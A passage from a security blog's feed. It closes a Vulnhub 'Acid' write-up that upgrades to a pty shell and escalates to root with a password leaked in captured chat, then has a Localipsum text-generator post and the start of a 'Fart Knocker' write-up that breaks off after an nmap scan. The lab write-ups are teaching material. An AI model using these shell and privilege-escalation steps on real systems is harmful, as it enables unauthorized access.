&lt;p&gt;We open the pcap file with &lt;a href="https://www.wireshark.org/"&gt;wireshark&lt;/a&gt;. There is a
lot of information in this file, over 6 000 trams.
On the 6 212 we notice some sort of text. By following the TCP stream (wireshark
function) we discover what seems to be a chat exchange:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;heya&lt;/p&gt;
&lt;p&gt;hello
What was the name of the Culprit ???&lt;/p&gt;
&lt;p&gt;saman and now a days he's known by the alias of 1337hax0r&lt;/p&gt;
&lt;p&gt;oh...Fuck....Great...Now, we gonna Catch Him Soon :D&lt;/p&gt;
&lt;p&gt;Yes .. We have to !! The mad bomber is on a rage&lt;/p&gt;
&lt;p&gt;Ohk...cya&lt;/p&gt;
&lt;p&gt;Over and Out&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Great, what does it means? We know that saman is one of the user on the machine.
Maybe we got some hints about it password or something like that.&lt;/p&gt;
&lt;h3 id="interactive-shell"&gt;interactive shell&lt;/h3&gt;
&lt;p&gt;In order to execute a su, we need a interactive shell (with
&lt;a href="https://en.wikipedia.org/wiki/Pseudoterminal"&gt;pty/tty&lt;/a&gt;).
Once more &lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;pentest monkey&lt;/a&gt;
will help us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As &lt;code&gt;/bin/sh&lt;/code&gt; is a symlink to dash, we directly use bash:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We now need to try to connect as saman.&lt;/p&gt;
&lt;h2 id="saman"&gt;Saman&lt;/h2&gt;
&lt;p&gt;With our beautiful shell we jut have to &lt;code&gt;su saman&lt;/code&gt; to try to connect as saman:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;acid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Challenge&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Magic_Box&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saman&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saman&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="n"&gt;hax0r&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It works! Let us try &lt;code&gt;sudo su&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;saman&lt;/span&gt;&lt;span class="nv"&gt;@acid&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nf"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Challenge&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Magic_Box&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;saman&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="n"&gt;hax0r&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@acid&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nf"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Challenge&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Magic_Box&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Dear&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Hax0r&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;successfully&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;completed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;hope&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;like&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;FLAG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;NAME&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Acid&lt;/span&gt;&lt;span class="nv"&gt;@Makke@Hax0r&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;It was a nice box to root but as I read the other write up it seems that my way
was not the one expected.
Nevertheless, thank to &lt;a href="https://twitter.com/m_avinash143"&gt;Avinash Kumar Thapa&lt;/a&gt;
for the box and &lt;a href="https://twitter.com/VulnHub"&gt;vulnhub&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="vulnhub"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>Localipsum, a sample text generator</title><link href="https://maggick.fr/2015/08/localipsum-a-sample-text-generator.html" rel="alternate"></link><published>2015-08-23T22:30:00+02:00</published><updated>2015-08-23T22:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-08-23:/2015/08/localipsum-a-sample-text-generator.html</id><summary type="html">&lt;p&gt;&lt;img alt="Localipsum" class="align-left" src="/media/2015.08/localipsum.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;Localipsum is a simple python program that aim to generate sample text for
designers and developers as the well known
&lt;a href="http://lipsum.co.uk/"&gt;Lorem Ipsum website&lt;/a&gt;. The main difference is that it use
your own dictionaries on your computer.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.08/localipsum.png" alt="Localipsum" width="262"&gt;&lt;/p&gt;
&lt;p&gt;Localipsum is a simple python program that aim to generate sample text for
designers and developers as the well known
&lt;a href="http://lipsum.co.uk/"&gt;Lorem Ipsum website&lt;/a&gt;. The main difference is that it use
your own dictionaries on your computer.&lt;/p&gt;


&lt;p&gt;I worked on this program at the beginning of the year on the basis of a fun idea:
use my own dictionaries to generate sample text.
This was a quick program to write but the vim's dictionaries were (and still
are) a problem (more on the dedicated section).&lt;/p&gt;
&lt;p&gt;I have stopped to work on this program as it fulfil my current need.&lt;/p&gt;
&lt;p&gt;The program is available on github under public license:
&lt;a href="http://github.com/maggick/localipsum"&gt;github.com/maggick/localipsum&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="usage"&gt;Usage&lt;/h2&gt;
&lt;p&gt;The documentation is display with the --help, -h option:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./localipsum.py -h&lt;/span&gt;
&lt;span class="code-line"&gt;usage: localipsum.py [-h] [--paragraphs] [--sentences] [--words] [--lorem] integer&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Localispum is a simple program providing sample text generating from your own&lt;/span&gt;
&lt;span class="code-line"&gt;dictionaries&lt;/span&gt;
&lt;span class="code-line"&gt;...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The program take in argument a integer and a "type" of text. The available
"type" of text are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;words (--words, -w)&lt;/li&gt;
&lt;li&gt;sentences (--sentences, -s)&lt;/li&gt;
&lt;li&gt;paragraphs (--paragraphs, -p)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The integer will indicate how many quantity of this object it should print.&lt;/p&gt;
&lt;p&gt;An optional argument (--lorem, -l) will put "Lorem ipsum dolor sit amet," at the
beginning of the generated text.&lt;/p&gt;
&lt;p&gt;And for instance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./localipsum.py --sentences 5&lt;/span&gt;
&lt;span class="code-line"&gt;Crutch&amp;#39;s just dissociable pick, janitors contractions appropriating multipliers&lt;/span&gt;
&lt;span class="code-line"&gt;beguiling patrimonial escorted opalescent penetrations coweringly forging await&lt;/span&gt;
&lt;span class="code-line"&gt;furtive northland roves humidification relentlessly tomb&amp;#39;s will. Styrofoam&lt;/span&gt;
&lt;span class="code-line"&gt;pediatric exposer incubator&amp;#39;s exam alibi&amp;#39;s misnomer, vi scope armpits swung&lt;/span&gt;
&lt;span class="code-line"&gt;commutative osteopathic serving chortle dreading rates composite chalked expose&lt;/span&gt;
&lt;span class="code-line"&gt;agreer preconceive magnanimity railroad. Filmstrip gases flatulent incant&lt;/span&gt;
&lt;span class="code-line"&gt;footstep purchasing, gyroscope&amp;#39;s furtiveness nun putnam pungent genuineness&lt;/span&gt;
&lt;span class="code-line"&gt;equator&amp;#39;s far transference. Carla bhutan, soundings protect jabbing knower&lt;/span&gt;
&lt;span class="code-line"&gt;pyramids reintroducing riven cumbersome. Siltstone consider amphibole,&lt;/span&gt;
&lt;span class="code-line"&gt;incident&amp;#39;s cherub clam&amp;#39;s should carolingian expired abatement charlemagne.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="dictionaries"&gt;Dictionaries&lt;/h2&gt;
&lt;p&gt;The program use the dictionaries from the &lt;code&gt;./locations&lt;/code&gt; file (one path per
line). Some basic dictionaries are already in it.&lt;/p&gt;
&lt;h3 id="usrsharedict"&gt;/usr/share/dict/&lt;/h3&gt;
&lt;p&gt;This directory may contain dictionaries on Unix system, on my own it contain a
dictionary for passwords cracking.&lt;/p&gt;
&lt;h3 id="firefox"&gt;Firefox&lt;/h3&gt;
&lt;p&gt;The Firefox dictionaries are located in a file like:
&lt;code&gt;~/.mozilla/firefox/xxxxxxxx.default/extensions/fr-dicollecte@dictionaries.addons.mozilla.org/dictionaries/&lt;/code&gt;
where xxxxxxxx is the identifier of your Firefox profile.&lt;/p&gt;
&lt;p&gt;If you have more than one profile each one will have a different name.&lt;/p&gt;
&lt;h3 id="vim"&gt;vim&lt;/h3&gt;
&lt;p&gt;The vim dictionaries are &lt;code&gt;spl&lt;/code&gt; and &lt;code&gt;sug&lt;/code&gt; files. The main ones are located in a
path like &lt;code&gt;/usr/share/vim/vimXX/spell/&lt;/code&gt; where XX is your version of vim (for me
it is 74 right now).&lt;/p&gt;
&lt;p&gt;Your personal dictionaries are located in &lt;code&gt;~/.vim/spell/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This files are not directly readable in python. The command &lt;code&gt;vim -c spelldump&lt;/code&gt;
let you display the current dictionary in a vim buffer. From there it is quit
simple to redirect it to a file. Nevertheless this suppose that vim is install
on the system and the file are not clean and include lots of non word in them.&lt;/p&gt;
&lt;p&gt;I choose not to include them in the program for now.&lt;/p&gt;
&lt;h2 id="technical-stuff"&gt;Technical stuff&lt;/h2&gt;
&lt;p&gt;The program is written in python 3, it is actually 128 lines written in 29
commits.&lt;/p&gt;
&lt;p&gt;It supposes that that the paths are Unix like.&lt;/p&gt;
&lt;h3 id="random-generation"&gt;Random generation&lt;/h3&gt;
&lt;p&gt;The &lt;strong&gt;words&lt;/strong&gt; are chosen with the &lt;code&gt;random.randint(0, len(dictionaries)-1)&lt;/code&gt; function.
We also put a comma if there is more than 7 words. This comma is placed randomly
with more and more probability to be place as the words are generated.&lt;/p&gt;
&lt;p&gt;In order to generate &lt;strong&gt;sentences&lt;/strong&gt;, we suppose that one sentence is composed of 10
to 25 words.&lt;/p&gt;
&lt;p&gt;In order to generate &lt;strong&gt;paragraphs&lt;/strong&gt;, we suppose that one paragraph is composed from
4 to 8 sentences.&lt;/p&gt;</content><category term="programming"></category><category term="python"></category><category term="programming"></category><category term="lorem ipsum"></category></entry><entry><title>Vulnhub - Fart Knocker</title><link href="https://maggick.fr/2015/06/vulnhub-fart-knocker.html" rel="alternate"></link><published>2015-06-16T23:30:00+02:00</published><updated>2015-06-16T23:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-06-16:/2015/06/vulnhub-fart-knocker.html</id><summary type="html">&lt;p&gt;&lt;img alt="beavis and butthead" class="align-left" src="/media/2015.06/beavis_butthead.jpg" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine an started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/"&gt;TopHatSec - Fart Knocker&lt;/a&gt;.
This VM is an Ubuntu 14.04 32 bits.&lt;/p&gt;
&lt;p&gt;The goal of this challenge is to break into the machine and root it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you beat the box then please shoot me an email! Have fun guys!
P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
day. Otherwise you kids might not understand :)&lt;/p&gt;
&lt;/blockquote&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.06/beavis_butthead.jpg" alt="beavis and butthead" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine an started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/"&gt;TopHatSec - Fart Knocker&lt;/a&gt;.
This VM is an Ubuntu 14.04 32 bits.&lt;/p&gt;
&lt;p&gt;The goal of this challenge is to break into the machine and root it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you beat the box then please shoot me an email! Have fun guys!
P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
day. Otherwise you kids might not understand :)&lt;/p&gt;
&lt;/blockquote&gt;


&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
&lt;p&gt;First of all we determine the VM IP address a with a simple &lt;code&gt;nmap -sP&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="nmap"&gt;Nmap&lt;/h2&gt;
&lt;p&gt;As always we start by &lt;a href="http://nmap.org/"&gt;nmaping&lt;/a&gt; the server in order to see the open ports:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@arch FartKnocker&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;6.47&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initiated&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Thu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;as&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;oA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.0034&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ow"&gt;Not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;shown&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;closed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="k"&gt;STATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SERVICE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.4.7&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_http&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Site&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;doesn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Service&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;detection&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;performed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Please&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;incorrect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
